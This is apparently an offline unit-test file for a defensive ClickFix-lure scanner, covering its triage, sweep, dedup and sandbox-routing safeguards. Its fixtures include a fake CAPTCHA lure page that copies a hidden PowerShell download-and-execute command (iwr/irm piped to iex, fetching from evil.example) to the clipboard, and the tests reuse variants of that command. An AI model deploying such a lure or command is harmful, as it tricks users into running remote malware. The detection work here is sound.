"""Offline tests for the ClickFix catcher sweep (clickfix_catcher).

No network and no browser: urlscan search + scan-detail are monkeypatched, and
the browser path is disabled. Covers DOM-signal triage, payload-URL exclusion,
static recovery from a captured DOM, and the JSONL evidence log.
"""
import json
import os
import sys
import tempfile
import types
import unittest

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "clickfix"))

import clickfix_catcher as k  # noqa: E402


class _Cand:
    def __init__(self, domain, url, uuid="u", t="2026-10-25T00:00:00Z"):
        self.domain, self.page_url, self.source_uuid, self.scan_time = domain, url, uuid, t


def _scan_with(dom):
    return types.SimpleNamespace(dom=dom)


LURE_DOM = """<html><body><div class="verify">I'm not a robot</div>
<p>To verify, press Windows key + R, then Ctrl + V, then press Enter</p>
<script>const commandToRun = `powershell -w hidden -c "iwr https://evil.example/a.ps1 | iex"`;
navigator.clipboard.writeText(commandToRun);</script></body></html>"""


class CatcherTestBase(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        self._orig_search = k.search_candidates
        self._orig_detail = k.fetch_scan_detail
        from config import load_config
        self.cfg = load_config()   # full cfg (urlscan/sanitize/cape); search is monkeypatched

    def tearDown(self):
        k.search_candidates = self._orig_search
        k.fetch_scan_detail = self._orig_detail
        import shutil
        shutil.rmtree(self.tmp, ignore_errors=True)

    def _wire(self, cands, dom_by_uuid):
        k.search_candidates = lambda cfg, max_results=25: cands
        k.fetch_scan_detail = lambda uuid, ucfg: _scan_with(dom_by_uuid.get(uuid, ""))


class TestTriage(CatcherTestBase):
    def test_lure_dom_is_signalled_and_recovered(self):
        c = _Cand("evil.example", "https://evil.example/verify", "u1")
        self._wire([c], {"u1": LURE_DOM})
        t = k.triage_candidate(c, self.cfg)
        self.assertTrue(t["clip_js"])
        self.assertTrue(t["instructions"])
        self.assertIsNotNone(t["static_cmd"])
        self.assertTrue(k._signalled(t))
        self.assertIn("powershell", t["static_cmd"]["text"].lower())

    def test_benign_dom_no_signal(self):
        c = _Cand("legit.example", "https://legit.example/", "u2")
        self._wire([c], {"u2": "<html><body><h1>Welcome</h1></body></html>"})
        t = k.triage_candidate(c, self.cfg)
        self.assertFalse(k._signalled(t))
        self.assertIsNone(t["static_cmd"])

    def test_payload_url_flagged(self):
        c = _Cand("evil.example", "https://evil.example/a.ps1", "u3")
        self._wire([c], {"u3": ""})
        t = k.triage_candidate(c, self.cfg)
        self.assertTrue(t["payload_url"])


class TestSweep(CatcherTestBase):
    def test_urlscan_sweep_recovers_static_command(self):
        c = _Cand("evil.example", "https://evil.example/verify", "u1")
        self._wire([c], {"u1": LURE_DOM})
        logp = os.path.join(self.tmp, "hits.jsonl")
        s = k.sweep(self.cfg, source="urlscan", use_browser=False, max_results=5, log_path=logp)
        self.assertEqual(s["candidates"], 1)
        self.assertEqual(len(s["recovered"]), 1)
        self.assertEqual(s["recovered"][0]["source"], "urlscan_dom")
        with open(logp) as fh:
            rows = [json.loads(line) for line in fh]
        self.assertEqual(len(rows), 1)
        self.assertIn("powershell", rows[0]["text"].lower())

    def test_urlscan_payload_url_not_recovered(self):
        c = _Cand("evil.example", "https://evil.example/a.ps1", "u3")
        self._wire([c], {"u3": LURE_DOM})
        s = k.sweep(self.cfg, source="urlscan", use_browser=False, max_results=5)
        self.assertEqual(s["recovered"], [])

    def test_urlscan_quiet_window_recovers_nothing(self):
        c = _Cand("legit.example", "https://legit.example/", "u2")
        self._wire([c], {"u2": "<html>nothing here</html>"})
        s = k.sweep(self.cfg, source="urlscan", use_browser=False, max_results=5)
        self.assertEqual(s["recovered"], [])


class TestLiveSource(CatcherTestBase):
    """The default 'live' source: ClickFix gist + URLhaus, static extract."""
    def setUp(self):
        super().setUp()
        self._orig_collect = k.livefeeds.collect_live
        self._orig_recover = k.livefeeds.recover_from_url

    def tearDown(self):
        k.livefeeds.collect_live = self._orig_collect
        k.livefeeds.recover_from_url = self._orig_recover
        super().tearDown()

    def test_live_sweep_recovers_from_feed(self):
        k.livefeeds.collect_live = lambda max_urls: [("https://evil.example/", "gist")]
        k.livefeeds.recover_from_url = lambda url: {
            "url": url, "domain": "evil.example", "bytes": 100,
            "command": 'powershell -w hidden -c "iwr https://evil.example/a.ps1 | iex"',
            "method": "clipboard_literal", "all_commands": []}
        s = k.sweep(self.cfg, source="live", max_results=5)
        self.assertEqual(s["source"], "live")
        self.assertEqual(s["candidates"], 1)
        self.assertEqual(len(s["recovered"]), 1)
        self.assertEqual(s["recovered"][0]["source"], "live:gist")
        self.assertIn("powershell", s["recovered"][0]["text"].lower())

    def test_both_sources_union(self):
        # source='both' unions urlscan + live-feed results in one sweep.
        c = _Cand("evil.example", "https://evil.example/verify", "u1")
        self._wire([c], {"u1": LURE_DOM})
        k.livefeeds.collect_live = lambda max_urls: [("https://live.example/", "gist")]
        k.livefeeds.recover_from_url = lambda url: {
            "url": url, "domain": "live.example", "bytes": 100,
            "command": 'powershell -w hidden -c "iwr https://live.example/a.ps1 | iex"',
            "method": "clipboard_literal", "all_commands": []}
        s = k.sweep(self.cfg, source="both", use_browser=False, max_results=5)
        domains = {r["domain"] for r in s["recovered"]}
        self.assertIn("evil.example", domains)   # from urlscan
        self.assertIn("live.example", domains)   # from the live feeds

    def test_live_sweep_quiet_when_no_command(self):
        k.livefeeds.collect_live = lambda max_urls: [("https://dead.example/", "gist")]
        k.livefeeds.recover_from_url = lambda url: {
            "url": url, "domain": "dead.example", "bytes": 0,
            "command": None, "method": None, "all_commands": []}
        s = k.sweep(self.cfg, source="live", max_results=5)
        self.assertEqual(s["candidates"], 1)
        self.assertEqual(s["recovered"], [])


class _FakeCape:
    """Records every submit so tests can assert the route NEVER spills."""
    def __init__(self):
        self.calls = []

    def submit_payload(self, filename, content, package, custom="", machine=""):
        self.calls.append({"filename": filename, "package": package, "custom": custom})
        return types.SimpleNamespace(task_id=4242, raw_response={})


def _routing_conf(tmp, **sections) -> str:
    """Write a throwaway routing.conf. Each kwarg is a route name -> enabled
    string, e.g. _routing_conf(tmp, vpn="yes", tor="no")."""
    import configparser
    cp = configparser.ConfigParser()
    for sect, enabled in sections.items():
        cp[sect] = {"enabled": str(enabled)}
    path = os.path.join(tmp, "routing.conf")
    with open(path, "w") as fh:
        cp.write(fh)
    return path


class TestNoSpillGuard(CatcherTestBase):
    def setUp(self):
        super().setUp()
        from config import load_config
        self.cfg = load_config()                 # real cfg (sanitize/classify/cape sections)
        self.cmd = {"text": 'powershell -w hidden -c "iwr https://evil.example/a.ps1 | iex"',
                    "domain": "evil.example", "url": "https://evil.example/verify",
                    "source": "browser", "uuid": "u1"}

    def test_isolated_route_never_returns_internet(self):
        # even if internet is 'enabled', it is NOT an isolated route
        path = _routing_conf(self.tmp, routing="no", internet="yes", vpn="no", tor="no", inetsim="no")
        route, reason = k.isolated_route_ready(path)
        self.assertIsNone(route)

    def test_falls_back_to_drop_when_no_isolated_route(self):
        # no isolated route -> detonate via 'drop' (runs sample, blocks egress, no leak)
        path = _routing_conf(self.tmp, vpn="no", tor="no", inetsim="no")
        self.cfg.cape.route = "internet"            # even if cfg starts as internet...
        fake = _FakeCape()
        rec = k._maybe_detonate(self.cfg, self.cmd, submit=True, routing_conf=path, client=fake)
        self.assertEqual(rec["detonation"], "submitted")
        self.assertEqual(rec["route"], "drop")      # ...it is forced to the non-leaking drop route
        self.assertEqual(self.cfg.cape.route, "drop")
        self.assertEqual(len(fake.calls), 1)        # submitted, but never via 'internet'

    def test_detonates_via_vpn_when_enabled(self):
        path = _routing_conf(self.tmp, vpn="yes")
        self.cfg.cape.route = "internet"            # even if cfg starts as internet...
        fake = _FakeCape()
        rec = k._maybe_detonate(self.cfg, self.cmd, submit=True, routing_conf=path, client=fake)
        self.assertEqual(rec["detonation"], "submitted")
        self.assertEqual(rec["route"], "vpn")
        self.assertEqual(rec["cape_task_id"], 4242)
        self.assertEqual(self.cfg.cape.route, "vpn")  # ...it was forced to the isolated route
        self.assertEqual(len(fake.calls), 1)

    def test_dry_run_never_submits(self):
        path = _routing_conf(self.tmp, vpn="yes")
        fake = _FakeCape()
        rec = k._maybe_detonate(self.cfg, self.cmd, submit=False, routing_conf=path, client=fake)
        self.assertEqual(rec["detonation"], "dry_run")
        self.assertEqual(fake.calls, [])

    def test_dedup_skips_already_detonated_command(self):
        path = _routing_conf(self.tmp, vpn="no")
        fake = _FakeCape()
        from collection import CollectionStore
        store = CollectionStore(os.path.join(self.tmp, "dedup.db"))
        r1 = k._maybe_detonate(self.cfg, self.cmd, submit=True, routing_conf=path, client=fake,
                               route="drop", store=store)
        r2 = k._maybe_detonate(self.cfg, self.cmd, submit=True, routing_conf=path, client=fake,
                               route="drop", store=store)
        store.close()
        self.assertEqual(r1["detonation"], "submitted")
        self.assertEqual(r2["detonation"], "dup_command")   # same command -> not re-detonated
        self.assertEqual(len(fake.calls), 1)                # submitted exactly once

    def test_same_payload_two_domains_both_recorded(self):
        # condition (4): two DIFFERENT domains serving the SAME command -> the
        # command is detonated once, but BOTH domains are recorded in the DB.
        path = _routing_conf(self.tmp, vpn="no")
        fake = _FakeCape()
        from collection import CollectionStore
        store = CollectionStore(os.path.join(self.tmp, "dedup2.db"))
        cmdA = {**self.cmd, "domain": "aaa.example", "url": "https://aaa.example/v"}
        cmdB = {**self.cmd, "domain": "bbb.example", "url": "https://bbb.example/v"}
        r1 = k._maybe_detonate(self.cfg, cmdA, submit=True, routing_conf=path, client=fake,
                               route="drop", store=store)
        r2 = k._maybe_detonate(self.cfg, cmdB, submit=True, routing_conf=path, client=fake,
                               route="drop", store=store)
        self.assertEqual(r1["detonation"], "submitted")
        self.assertEqual(r2["detonation"], "dup_command")   # same payload -> detonated once
        self.assertEqual(len(fake.calls), 1)
        self.assertIsNotNone(store.domain("aaa.example"))   # ...but both domains recorded
        self.assertIsNotNone(store.domain("bbb.example"))
        store.close()

    def test_second_different_payload_from_same_domain_skipped(self):
        # polymorphic host: SAME domain/IP, a DIFFERENT payload each fetch -> the
        # source is detonated ONCE, later variants are skipped as dup_domain.
        path = _routing_conf(self.tmp, vpn="no")
        fake = _FakeCape()
        from collection import CollectionStore
        store = CollectionStore(os.path.join(self.tmp, "srcdedup.db"))
        p1 = {**self.cmd, "domain": "93.152.0.1",
              "text": 'powershell -w hidden -c "iex(irm https://x/a1.ps1)"'}
        p2 = {**self.cmd, "domain": "93.152.0.1",
              "text": 'powershell -w hidden -c "iex(irm https://x/DIFFERENT.ps1)"'}
        r1 = k._maybe_detonate(self.cfg, p1, submit=True, routing_conf=path, client=fake,
                               route="drop", store=store)
        r2 = k._maybe_detonate(self.cfg, p2, submit=True, routing_conf=path, client=fake,
                               route="drop", store=store)
        store.close()
        self.assertEqual(r1["detonation"], "submitted")
        self.assertEqual(r2["detonation"], "dup_domain")   # same source -> not re-run
        self.assertEqual(len(fake.calls), 1)               # detonated exactly once

    def test_unextractable_site_domain_not_recorded(self):
        # condition (3): a site whose text is not a usable payload is skipped and
        # its domain is NOT written to the DB.
        path = _routing_conf(self.tmp, vpn="no")
        fake = _FakeCape()
        from collection import CollectionStore
        store = CollectionStore(os.path.join(self.tmp, "dedup3.db"))
        bad = {"text": "just some harmless words here", "domain": "benign.example",
               "url": "https://benign.example/", "uuid": "x"}
        rec = k._maybe_detonate(self.cfg, bad, submit=True, routing_conf=path, client=fake,
                                route="drop", store=store)
        self.assertTrue(rec["detonation"].startswith("skipped"))
        self.assertIsNone(store.domain("benign.example"))   # not recorded
        self.assertEqual(fake.calls, [])
        store.close()

    def test_ps1_filename_is_named_after_domain(self):
        # condition (1): the submitted .ps1 is named after the source domain.
        path = _routing_conf(self.tmp, vpn="no")
        fake = _FakeCape()
        rec = k._maybe_detonate(self.cfg, self.cmd, submit=True, routing_conf=path, client=fake,
                                route="drop")
        self.assertEqual(rec["detonation"], "submitted")
        self.assertIn("evil.example", fake.calls[0]["filename"])
        self.assertTrue(fake.calls[0]["filename"].endswith(".ps1"))

    def test_ps1_written_to_local_disk(self):
        # a detonated payload is also saved locally (domain-named) so it's browsable.
        self.cfg.pipeline.commands_dir = os.path.join(self.tmp, "commands")
        path = _routing_conf(self.tmp, vpn="no")
        fake = _FakeCape()
        rec = k._maybe_detonate(self.cfg, self.cmd, submit=True, routing_conf=path, client=fake,
                                route="drop")
        self.assertIn("local_path", rec)
        self.assertTrue(os.path.isfile(rec["local_path"]))
        self.assertIn("evil.example", os.path.basename(rec["local_path"]))
        with open(rec["local_path"], encoding="utf-8") as fh:
            self.assertIn("iex", fh.read().lower())

    def test_internet_full_detonation(self):
        # route=internet is used as-is for full second-stage detonation
        path = _routing_conf(self.tmp, vpn="no", tor="no", inetsim="no")
        fake = _FakeCape()
        rec = k._maybe_detonate(self.cfg, self.cmd, submit=True, routing_conf=path, client=fake,
                                route="internet")
        self.assertEqual(rec["detonation"], "submitted")
        self.assertEqual(rec["route"], "internet")
        self.assertEqual(self.cfg.cape.route, "internet")
        self.assertEqual(len(fake.calls), 1)

    def test_unclassifiable_text_skipped(self):
        path = _routing_conf(self.tmp, vpn="yes")
        fake = _FakeCape()
        rec = k._maybe_detonate(self.cfg, {"text": "just some harmless words here", "uuid": "x"},
                                submit=True, routing_conf=path, client=fake)
        self.assertTrue(rec["detonation"].startswith("skipped"))
        self.assertEqual(fake.calls, [])


if __name__ == "__main__":
    unittest.main()
